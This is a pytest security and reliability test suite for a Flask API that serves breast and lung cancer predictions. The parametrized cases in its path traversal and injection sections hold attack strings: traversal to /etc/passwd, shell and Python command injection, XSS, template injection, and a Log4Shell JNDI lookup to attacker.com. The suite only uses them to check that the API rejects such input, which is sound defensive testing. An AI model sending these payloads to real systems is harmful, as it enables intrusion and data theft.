"""
Step 19 — Member 3B Security, Reliability & Failure-Handling Test Suite.

Comprehensive verification of:
- Input validation security (missing fields, invalid disease names, bad types)
- Malformed, truncated, and non-dict JSON handling
- Duplicate JSON key rejection (envelope and nested data)
- Content-Type enforcement
- Feature injection (NaN, Infinity, string-as-numeric, extra fields, negative age)
- Path traversal and code injection safety
- Error response sanitization (no tracebacks, paths, or secrets leaked)
- Model-info and health check information disclosure prevention
- HTTP method restrictions (405 Method Not Allowed)
- Controlled oversized payload rejection
- 20-cycle repeated valid prediction reliability (idempotence)
- 20-cycle invalid request resilience (server stability)
- Simulated model/preprocessor unavailability (503 Service Unavailable)
- Simulated internal service fault (500 Internal Error)
- Environment and production debug safety
- Production WSGI compliance and artifact hash preservation
"""

from typing import Dict, Any, List
from pathlib import Path
import hashlib
import io
import json
import math
import os
import pytest
from unittest.mock import MagicMock
from wsgiref.validate import validator

from member3b.common.config import get_config, AppConfig
from member3b.common.api import create_app
from member3b.common.service import (
    CancerPredictionService,
    UNIFIED_SERVICE_NAME,
    SUPPORTED_DISEASES,
)
import member3b.app as wsgi_module
from member3b.breast_cancer.src.data_loader import load_raw_breast_cancer_data
from member3b.lung_cancer.src.data_loader import load_raw_lung_cancer_data
from member3b.breast_cancer.src.service import BreastCancerPredictionService
from member3b.lung_cancer.src.service import LungCancerPredictionService


@pytest.fixture
def app_client():
    """Provides a fresh Flask test client."""
    test_app = create_app(test_config={"TESTING": True})
    return test_app.test_client()


@pytest.fixture
def valid_breast_payload() -> Dict[str, Any]:
    """Provides a valid Breast Cancer feature dictionary from row 0."""
    df = load_raw_breast_cancer_data()
    feature_cols = [c for c in df.columns if c not in ["id", "diagnosis", "Unnamed: 32"]]
    return {col: float(df.iloc[0][col]) for col in feature_cols}


@pytest.fixture
def valid_lung_payload() -> Dict[str, Any]:
    """Provides a valid Lung Cancer feature dictionary from row 0."""
    df = load_raw_lung_cancer_data()
    row = df.iloc[0]
    return {
        "gender": str(row["GENDER"]),
        "age": float(row["AGE"]),
        "smoking": int(row["SMOKING"]),
        "yellow_fingers": int(row["YELLOW_FINGERS"]),
        "anxiety": int(row["ANXIETY"]),
        "peer_pressure": int(row["PEER_PRESSURE"]),
        "chronic_disease": int(row["CHRONIC DISEASE"]),
        "fatigue": int(row["FATIGUE "]),
        "allergy": int(row["ALLERGY "]),
        "wheezing": int(row["WHEEZING"]),
        "alcohol_consuming": int(row["ALCOHOL CONSUMING"]),
        "coughing": int(row["COUGHING"]),
        "shortness_of_breath": int(row["SHORTNESS OF BREATH"]),
        "swallowing_difficulty": int(row["SWALLOWING DIFFICULTY"]),
        "chest_pain": int(row["CHEST PAIN"]),
    }


# =============================================================================
# 1. Input Validation Security (Step 19.3)
# =============================================================================

@pytest.mark.parametrize(
    "payload",
    [
        {},
        {"disease": "breast_cancer"},
        {"data": {}},
        {"disease": "breast_cancer", "data": {}},
        {"disease": "lung_cancer", "data": {}},
    ],
)
def test_envelope_missing_or_empty_fields(app_client, payload):
    """Verifies missing envelope fields or empty data returns HTTP 400 with safe JSON."""
    resp = app_client.post("/api/member3b/predict", json=payload)
    assert resp.status_code == 400
    assert resp.is_json
    data = resp.get_json()
    assert data["status"] == "error"
    assert data["error_type"] == "validation_error"
    assert "Traceback" not in resp.get_data(as_text=True)


@pytest.mark.parametrize(
    "invalid_disease",
    [
        "unknown",
        "admin",
        "../../something",
        "<script>alert(1)</script>",
        "DROP TABLE users;",
        "None",
        "",
        "   ",
    ],
)
def test_envelope_invalid_disease_identifiers(app_client, invalid_disease, valid_breast_payload):
    """Verifies invalid, malformed, or malicious disease identifiers are rejected with HTTP 400."""
    resp = app_client.post(
        "/api/member3b/predict",
        json={"disease": invalid_disease, "data": valid_breast_payload},
    )
    assert resp.status_code == 400
    assert resp.is_json
    data = resp.get_json()
    assert data["status"] == "error"
    assert data["error_type"] == "validation_error"
    assert "Traceback" not in resp.get_data(as_text=True)


@pytest.mark.parametrize("invalid_data", [[], "test_string", 12345, None, 3.14])
def test_envelope_invalid_data_types(app_client, invalid_data):
    """Verifies non-dict data fields for both diseases return HTTP 400."""
    for disease in ["breast_cancer", "lung_cancer"]:
        resp = app_client.post(
            "/api/member3b/predict",
            json={"disease": disease, "data": invalid_data},
        )
        assert resp.status_code == 400
        assert resp.is_json
        assert resp.get_json()["error_type"] == "validation_error"


# =============================================================================
# 2. Malformed JSON Testing (Step 19.4)
# =============================================================================

@pytest.mark.parametrize(
    "malformed_body",
    [
        "{invalid_json",
        '{"disease": "breast_cancer", "data":',
        "{'disease': 'breast_cancer'}",
        '{"disease": "breast_cancer"} trailing_chars',
        "",
        "   \n\t  ",
        "[1, 2, 3]",
        '"just_a_json_string"',
        "999999",
        "true",
        "null",
    ],
)
def test_malformed_and_non_dict_json_bodies(app_client, malformed_body):
    """Verifies malformed JSON, empty bodies, and non-dict JSON bodies return HTTP 400."""
    resp = app_client.post(
        "/api/member3b/predict",
        data=malformed_body,
        headers={"Content-Type": "application/json"},
    )
    assert resp.status_code == 400
    assert resp.is_json
    data = resp.get_json()
    assert data["status"] == "error"
    assert data["error_type"] == "invalid_request"
    assert "Traceback" not in resp.get_data(as_text=True)


# =============================================================================
# 3. Duplicate JSON Key Testing (Step 19.5)
# =============================================================================

def test_duplicate_keys_in_envelope(app_client):
    """Verifies duplicate keys in outer JSON envelope are strictly rejected with HTTP 400."""
    raw = '{"disease": "breast_cancer", "disease": "lung_cancer", "data": {}}'
    resp = app_client.post("/api/member3b/predict", data=raw, headers={"Content-Type": "application/json"})
    assert resp.status_code == 400
    assert resp.is_json
    data = resp.get_json()
    assert data["status"] == "error"
    assert "Duplicate JSON field" in data["message"]


def test_duplicate_keys_in_nested_data(app_client):
    """Verifies duplicate keys inside nested data dictionary are strictly rejected with HTTP 400."""
    raw = (
        '{"disease": "breast_cancer", "data": {'
        '"radius_mean": 17.99, "radius_mean": 25.0'
        '}}'
    )
    resp = app_client.post("/api/member3b/predict", data=raw, headers={"Content-Type": "application/json"})
    assert resp.status_code == 400
    assert resp.is_json
    data = resp.get_json()
    assert data["status"] == "error"
    assert "Duplicate JSON field" in data["message"]


# =============================================================================
# 4. Content-Type Security (Step 19.6)
# =============================================================================

@pytest.mark.parametrize(
    "content_type",
    [
        "text/plain",
        "application/xml",
        "multipart/form-data",
        "application/x-www-form-urlencoded",
        "application/octet-stream",
    ],
)
def test_unsupported_content_types_rejected(app_client, content_type, valid_breast_payload):
    """Verifies non-JSON Content-Type requests are rejected with HTTP 400."""
    body = json.dumps({"disease": "breast_cancer", "data": valid_breast_payload})
    resp = app_client.post("/api/member3b/predict", data=body, headers={"Content-Type": content_type})
    assert resp.status_code == 400
    assert resp.is_json
    data = resp.get_json()
    assert data["status"] == "error"
    assert "Content-Type application/json" in data["message"]


# =============================================================================
# 5. Feature Injection Testing (Step 19.7)
# =============================================================================

def test_breast_feature_injection_missing(app_client, valid_breast_payload):
    """Verifies missing Breast Cancer feature is rejected with HTTP 400."""
    corrupted = dict(valid_breast_payload)
    del corrupted["radius_mean"]
    resp = app_client.post("/api/member3b/predict", json={"disease": "breast_cancer", "data": corrupted})
    assert resp.status_code == 400
    assert "Missing required feature" in resp.get_json()["message"]


def test_breast_feature_injection_unexpected(app_client, valid_breast_payload):
    """Verifies extra/injected feature in Breast Cancer payload is rejected with HTTP 400."""
    corrupted = dict(valid_breast_payload)
    corrupted["malicious_extra_feature"] = 123.45
    resp = app_client.post("/api/member3b/predict", json={"disease": "breast_cancer", "data": corrupted})
    assert resp.status_code == 400
    assert "Unexpected feature encountered" in resp.get_json()["message"]


@pytest.mark.parametrize("bad_val", ["not_a_number", None, math.nan, math.inf, -math.inf])
def test_breast_feature_injection_invalid_values(app_client, valid_breast_payload, bad_val):
    """Verifies non-numeric, NaN, infinite, and None values are rejected with HTTP 400."""
    corrupted = dict(valid_breast_payload)
    corrupted["radius_mean"] = bad_val
    resp = app_client.post("/api/member3b/predict", json={"disease": "breast_cancer", "data": corrupted})
    assert resp.status_code == 400
    assert resp.is_json
    assert "Traceback" not in resp.get_data(as_text=True)


def test_lung_feature_injection_missing(app_client, valid_lung_payload):
    """Verifies missing Lung Cancer feature is rejected with HTTP 400."""
    corrupted = dict(valid_lung_payload)
    del corrupted["age"]
    resp = app_client.post("/api/member3b/predict", json={"disease": "lung_cancer", "data": corrupted})
    assert resp.status_code == 400
    assert "Missing required feature" in resp.get_json()["message"]


def test_lung_feature_injection_unexpected(app_client, valid_lung_payload):
    """Verifies extra/injected feature in Lung Cancer payload is rejected with HTTP 400."""
    corrupted = dict(valid_lung_payload)
    corrupted["unauthorized_field"] = "injection"
    resp = app_client.post("/api/member3b/predict", json={"disease": "lung_cancer", "data": corrupted})
    assert resp.status_code == 400
    assert "Unexpected feature encountered" in resp.get_json()["message"]


@pytest.mark.parametrize("bad_age", [-10, 0, 150, "not_an_age", None, math.nan, math.inf, True])
def test_lung_feature_injection_invalid_age(app_client, valid_lung_payload, bad_age):
    """Verifies out-of-range, boolean, non-numeric, NaN, and Inf ages are rejected with HTTP 400."""
    corrupted = dict(valid_lung_payload)
    corrupted["age"] = bad_age
    resp = app_client.post("/api/member3b/predict", json={"disease": "lung_cancer", "data": corrupted})
    assert resp.status_code == 400
    assert resp.is_json


@pytest.mark.parametrize("bad_gender", ["OTHER", "INVALID", True, False, 5, -1])
def test_lung_feature_injection_invalid_gender(app_client, valid_lung_payload, bad_gender):
    """Verifies invalid gender categories and boolean inputs are rejected with HTTP 400."""
    corrupted = dict(valid_lung_payload)
    corrupted["gender"] = bad_gender
    resp = app_client.post("/api/member3b/predict", json={"disease": "lung_cancer", "data": corrupted})
    assert resp.status_code == 400
    assert resp.is_json


# =============================================================================
# 6. Path Traversal & Command Injection Testing (Steps 19.8 & 19.9)
# =============================================================================

@pytest.mark.parametrize(
    "traversal_vector",
    [
        "../../../../etc/passwd",
        r"..\..\..\windows\system32",
        "/etc/passwd",
        r"C:\Windows\System32",
        "....//....//etc/shadow",
    ],
)
def test_path_traversal_attempts_rejected(app_client, traversal_vector, valid_breast_payload):
    """Verifies path traversal strings in disease field are rejected and cannot touch filesystem."""
    resp = app_client.post(
        "/api/member3b/predict",
        json={"disease": traversal_vector, "data": valid_breast_payload},
    )
    assert resp.status_code == 400
    assert resp.is_json
    data = resp.get_json()
    assert data["status"] == "error"
    # Ensure traversal string does not leak back full path or stack trace
    assert "Traceback" not in resp.get_data(as_text=True)
    assert "root:x:0:0" not in resp.get_data(as_text=True)


@pytest.mark.parametrize(
    "injection_payload",
    [
        "; whoami",
        "$(whoami)",
        "`whoami`",
        '__import__("os").system("whoami")',
        '<%= system("whoami") %>',
        "<script>alert('xss')</script>",
        "{{7*7}}",
        "${jndi:ldap://attacker.com/a}",
    ],
)
def test_command_and_code_injection_strings_rejected(app_client, injection_payload, valid_lung_payload):
    """Verifies command/code injection strings are rejected and never evaluated."""
    # Test in disease field
    r1 = app_client.post(
        "/api/member3b/predict",
        json={"disease": injection_payload, "data": valid_lung_payload},
    )
    assert r1.status_code == 400

    # Test in gender string field of Lung Cancer
    corrupted = dict(valid_lung_payload)
    corrupted["gender"] = injection_payload
    r2 = app_client.post(
        "/api/member3b/predict",
        json={"disease": "lung_cancer", "data": corrupted},
    )
    assert r2.status_code == 400
    assert "49" not in r2.get_data(as_text=True)  # No SSTI evaluation


# =============================================================================
# 7. Response Leakage Testing (Step 19.10)
# =============================================================================

def test_response_leakage_prohibited_strings(app_client):
    """Verifies 400, 404, 405 error responses do not leak sensitive paths, tracebacks, or secrets."""
    forbidden_tokens = [
        "Traceback (most recent call last):",
        'File "/',
        "site-packages",
        "FLASK_SECRET",
        "SECRET_KEY",
        "DATABASE_URL",
        ".joblib",
    ]

    # Test 400
    r400 = app_client.post("/api/member3b/predict", data="invalid", headers={"Content-Type": "application/json"})
    t400 = r400.get_data(as_text=True)
    for token in forbidden_tokens:
        assert token not in t400, f"Token '{token}' leaked in 400 response"

    # Test 404
    r404 = app_client.get("/api/member3b/nonexistent_path")
    t404 = r404.get_data(as_text=True)
    for token in forbidden_tokens:
        assert token not in t404, f"Token '{token}' leaked in 404 response"

    # Test 405
    r405 = app_client.delete("/api/member3b/health")
    t405 = r405.get_data(as_text=True)
    for token in forbidden_tokens:
        assert token not in t405, f"Token '{token}' leaked in 405 response"


# =============================================================================
# 8. Model-Info & Health Endpoint Security (Steps 19.11 & 19.12)
# =============================================================================

def test_model_info_security(app_client):
    """Verifies model-info endpoints do not leak internal paths, weights, or training data."""
    endpoints = [
        "/api/member3b/model-info",
        "/api/breast-cancer/model-info",
        "/api/lung-cancer/model-info",
    ]
    for endpoint in endpoints:
        resp = app_client.get(endpoint)
        assert resp.status_code == 200
        text = resp.get_data(as_text=True)
        assert ".joblib" not in text
        assert "coef_" not in text
        assert "intercept_" not in text
        assert "C:\\" not in text
        assert "site-packages" not in text


def test_health_endpoints_security(app_client):
    """Verifies health endpoints do not leak internal paths or exception traces."""
    endpoints = [
        "/api/member3b/health",
        "/api/breast-cancer/health",
        "/api/lung-cancer/health",
    ]
    for endpoint in endpoints:
        resp = app_client.get(endpoint)
        assert resp.status_code == 200
        text = resp.get_data(as_text=True)
        assert ".joblib" not in text
        assert "Traceback" not in text
        assert "site-packages" not in text


# =============================================================================
# 9. HTTP Method Security (Step 19.13)
# =============================================================================

@pytest.mark.parametrize("method", ["PUT", "PATCH", "DELETE"])
@pytest.mark.parametrize(
    "endpoint",
    [
        "/api/member3b/predict",
        "/api/member3b/model-info",
        "/api/member3b/health",
        "/api/breast-cancer/predict/user",
        "/api/lung-cancer/predict/user",
    ],
)
def test_unsupported_http_methods_rejected(app_client, method, endpoint):
    """Verifies PUT, PATCH, DELETE on API endpoints return HTTP 405 Method Not Allowed."""
    resp = app_client.open(endpoint, method=method)
    assert resp.status_code == 405
    assert resp.is_json
    data = resp.get_json()
    assert data["status"] == "error"
    assert data["error_type"] == "method_not_allowed"


# =============================================================================
# 10. Oversized Request / Resource Safety (Step 19.14)
# =============================================================================

def test_oversized_payload_safety(app_client, valid_breast_payload):
    """Verifies oversized payload with 200 injected features is rejected safely without crash."""
    oversized_data = dict(valid_breast_payload)
    for i in range(200):
        oversized_data[f"extra_junk_feature_{i}"] = 1.2345 * i

    resp = app_client.post(
        "/api/member3b/predict",
        json={"disease": "breast_cancer", "data": oversized_data},
    )
    assert resp.status_code == 400
    assert resp.is_json
    assert resp.get_json()["status"] == "error"


# =============================================================================
# 11. Repeated Request Reliability & Idempotence (Step 19.15)
# =============================================================================

def test_repeated_valid_predictions_breast(app_client, valid_breast_payload):
    """Verifies 20 repeated valid Breast Cancer predictions yield strictly identical outputs."""
    first_resp = app_client.post(
        "/api/member3b/predict",
        json={"disease": "breast_cancer", "data": valid_breast_payload},
    )
    assert first_resp.status_code == 200
    baseline_result = first_resp.get_json()

    for _ in range(20):
        resp = app_client.post(
            "/api/member3b/predict",
            json={"disease": "breast_cancer", "data": valid_breast_payload},
        )
        assert resp.status_code == 200
        current_result = resp.get_json()
        assert current_result == baseline_result


def test_repeated_valid_predictions_lung(app_client, valid_lung_payload):
    """Verifies 20 repeated valid Lung Cancer predictions yield strictly identical outputs."""
    first_resp = app_client.post(
        "/api/member3b/predict",
        json={"disease": "lung_cancer", "data": valid_lung_payload},
    )
    assert first_resp.status_code == 200
    baseline_result = first_resp.get_json()

    for _ in range(20):
        resp = app_client.post(
            "/api/member3b/predict",
            json={"disease": "lung_cancer", "data": valid_lung_payload},
        )
        assert resp.status_code == 200
        current_result = resp.get_json()
        assert current_result == baseline_result



# =============================================================================
# 12. Invalid Request Stability (Step 19.16)
# =============================================================================

def test_invalid_requests_stability(app_client, valid_breast_payload):
    """Verifies sending 20 varied invalid requests does not destabilize the server or corrupt state."""
    invalid_payloads = [
        {},
        {"disease": "invalid"},
        {"disease": "breast_cancer", "data": {}},
        {"disease": "breast_cancer", "data": "bad"},
        {"disease": "breast_cancer", "data": []},
        {"disease": "lung_cancer", "data": None},
        {"disease": 123, "data": {}},
        {"data": {}},
        {"disease": "breast_cancer", "mode": "invalid_mode", "data": valid_breast_payload},
        {"disease": "breast_cancer", "data": {"radius_mean": "string_val"}},
        {"disease": "lung_cancer", "data": {"age": -50}},
        {"disease": "lung_cancer", "data": {"gender": "UNKNOWN"}},
        {"disease": "lung_cancer", "data": {"smoking": 99}},
        {"disease": "../path", "data": {}},
        {"disease": "<script>", "data": {}},
        {"disease": "breast_cancer", "data": {"radius_mean": math.nan}},
        {"disease": "breast_cancer", "data": {"radius_mean": math.inf}},
        {"disease": "lung_cancer", "data": {"age": 999}},
        {"disease": "breast_cancer"},
        {"disease": None, "data": None},
    ]

    for p in invalid_payloads:
        resp = app_client.post("/api/member3b/predict", json=p)
        assert resp.status_code == 400

    # Verify server immediately processes valid request successfully
    healthy_resp = app_client.post(
        "/api/member3b/predict",
        json={"disease": "breast_cancer", "data": valid_breast_payload},
    )
    assert healthy_resp.status_code == 200
    assert healthy_resp.get_json()["status"] == "success"


# =============================================================================
# 13. Model & Service Failure Simulation (Steps 19.17 & 19.18)
# =============================================================================

def test_simulated_model_failure_returns_503(monkeypatch):
    """Verifies simulated model unavailability returns HTTP 503 without traceback."""
    def mock_broken_health():
        return {
            "status": "unhealthy",
            "disease": "breast_cancer",
            "model_loaded": False,
            "preprocessor_loaded": False,
        }
    monkeypatch.setattr(BreastCancerPredictionService, "health_check", lambda self: mock_broken_health())

    app = create_app(test_config={"TESTING": True})
    client = app.test_client()
    resp = client.get("/api/member3b/health")
    assert resp.status_code == 503
    assert resp.get_json()["status"] == "unavailable"
    assert "Traceback" not in resp.get_data(as_text=True)


def test_simulated_service_failure_returns_500():
    """Verifies unhandled service exceptions return HTTP 500 with safe JSON without traceback."""
    mock_svc = MagicMock(spec=CancerPredictionService)
    mock_svc.predict.side_effect = RuntimeError("Simulated unexpected internal engine failure")

    custom_app = create_app(test_config={"TESTING": False, "DEBUG": False}, service=mock_svc)
    client = custom_app.test_client()

    resp = client.post(
        "/api/member3b/predict",
        json={"disease": "breast_cancer", "data": {"radius_mean": 1.0}},
    )
    assert resp.status_code == 500
    assert resp.is_json
    data = resp.get_json()
    assert data["status"] == "error"
    assert data["error_type"] == "internal_error"
    assert "RuntimeError" not in resp.get_data(as_text=True)
    assert "Traceback" not in resp.get_data(as_text=True)


# =============================================================================
# 14. Environment & Production Debug Safety (Steps 19.19 & 19.20)
# =============================================================================

def test_environment_and_git_hygiene():
    """Verifies .env is ignored and .env.example contains only safe placeholders."""
    repo_root = Path(__file__).resolve().parent.parent.parent.parent
    gitignore_path = repo_root / ".gitignore"
    env_example_path = repo_root / "member3b" / ".env.example"

    assert gitignore_path.exists()
    gitignore_content = gitignore_path.read_text(encoding="utf-8")
    assert ".env" in gitignore_content
    assert ".venv/" in gitignore_content
    assert "__pycache__/" in gitignore_content

    assert env_example_path.exists()
    example_content = env_example_path.read_text(encoding="utf-8")
    for secret_keyword in ["api_key", "password", "secret_key", "token"]:
        # Verify no assigned values look like real secrets
        for line in example_content.splitlines():
            if line.strip().lower().startswith(secret_keyword):
                assert False, f"Potential credential found in .env.example: {line}"


def test_production_debug_safety():
    """Verifies that production configuration enforces debug=False and disables Flask debugger."""
    cfg = get_config()
    assert cfg.DEBUG is False
    assert cfg.ENV == "production"

    app = create_app()
    assert app.debug is False
    assert app.testing is False


# =============================================================================
# 15. WSGI Protocol Recheck (Step 19.21)
# =============================================================================

def test_wsgi_compliance_recheck():
    """Re-verifies that member3b.app:app is callable and compliant with PEP 3333."""
    app = wsgi_module.app
    assert callable(app)
    assert hasattr(app, "wsgi_app")

    validated = validator(app.wsgi_app)
    environ = {
        "REQUEST_METHOD": "GET",
        "SCRIPT_NAME": "",
        "PATH_INFO": "/api/member3b/health",
        "QUERY_STRING": "",
        "SERVER_NAME": "127.0.0.1",
        "SERVER_PORT": "5000",
        "SERVER_PROTOCOL": "HTTP/1.1",
        "wsgi.version": (1, 0),
        "wsgi.url_scheme": "http",
        "wsgi.input": io.BytesIO(b""),
        "wsgi.errors": io.StringIO(),
        "wsgi.multithread": True,
        "wsgi.multiprocess": False,
        "wsgi.run_once": False,
    }

    status_holder = []
    def start_response(status, headers, exc_info=None):
        status_holder.append(status)

    response_iter = validated(environ, start_response)
    try:
        body = b"".join(response_iter)
    finally:
        if hasattr(response_iter, "close"):
            response_iter.close()

    assert len(status_holder) == 1
    assert "200 OK" in status_holder[0]
    assert b'"status": "ready"' in body or b'"status":"ready"' in body


# =============================================================================
# 16. File & Artifact Hash Immutability (Steps 19.22 & 19.23)
# =============================================================================

def test_all_dataset_and_model_hashes_immutable():
    """Verifies all raw datasets and model/preprocessor artifacts match exact verified hashes."""
    repo_root = Path(__file__).resolve().parent.parent.parent.parent
    expected_hashes = {
        repo_root / "dataset" / "breast.csv": "1425d9affa78ba8e53afc81d0ef8a19069ee10c4b21fe89b3cf514071b12ee33",
        repo_root / "dataset" / "survey_lung_cancer.csv": "181ccdd5e12900a9a428e1ad7a570227617d41266c4dc7930465ebfa009a3efd",
        repo_root / "member3b" / "breast_cancer" / "models" / "breast_cancer_model.joblib": "0379e06d00ad57a172c6c8c6b91eaba48a619e0783644ead1cf5b3e855b32024",
        repo_root / "member3b" / "breast_cancer" / "models" / "breast_cancer_preprocessor.joblib": "7dc70392e4bda3f3b53f5cb6b0b6be6a085059b3d706284e392157beb41c3092",
        repo_root / "member3b" / "lung_cancer" / "models" / "lung_cancer_model.joblib": "4c31a9af4b304a21fc9eed29f9c5a9f74caec0cadf02f0d36afde3747eeb6785",
        repo_root / "member3b" / "lung_cancer" / "models" / "lung_cancer_preprocessor.joblib": "f40b1b0f3d4f2ff6322d8362cf8c1eaaa7c6e5dab612a29dba2e00cdcb2d527c",
    }

    for path, expected in expected_hashes.items():
        assert path.exists(), f"Tracked file missing: {path}"
        actual = hashlib.sha256(path.read_bytes()).hexdigest()
        assert actual == expected, f"Hash mismatch for {path.name}: expected {expected}, got {actual}"
